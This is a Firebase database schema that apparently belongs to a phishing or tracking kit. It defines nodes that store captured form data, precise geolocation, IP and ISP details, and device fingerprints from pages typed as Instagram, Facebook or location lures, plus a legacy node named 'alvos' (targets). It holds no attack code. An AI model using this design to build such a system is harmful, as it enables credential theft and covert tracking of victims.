-- Firebase Realtime Database Schema Documentation
-- This is a reference schema for the Firebase structure

-- Main captures node (new structure with full geolocation)
captures/
  {captureId}/
    id: string
    pageName: string
    pageType: string (instagram, facebook, location)
    timestamp: number
    formData: object (optional - form submission data)
    geolocation: object (optional)
      latitude: number
      longitude: number
      accuracy: number
      timestamp: number
      city: string
      country: string
      countryCode: string
      region: string
      timezone: string
    ipData: object (optional)
      ip: string
      city: string
      region: string
      country: string
      countryCode: string
      timezone: string
      isp: string
      org: string
      as: string
    deviceInfo: object
      userAgent: string
      platform: string
      language: string
      screenResolution: string
      timezone: string
      cookiesEnabled: boolean

-- Legacy alvos node (kept for backward compatibility)
alvos/
  {alvoId}/
    pageType: string
    pageName: string
    data: object
    timestamp: string
    ipAddress: string
    userAgent: string

-- Pages node (existing structure)
pages/
  {pageId}/
    id: string
    name: string
    slug: string
    template: string
    content: object
    views: number
    createdAt: number
    updatedAt: number

-- System configuration
system/
  configured: boolean
  admin: object
    email: string
    uid: string
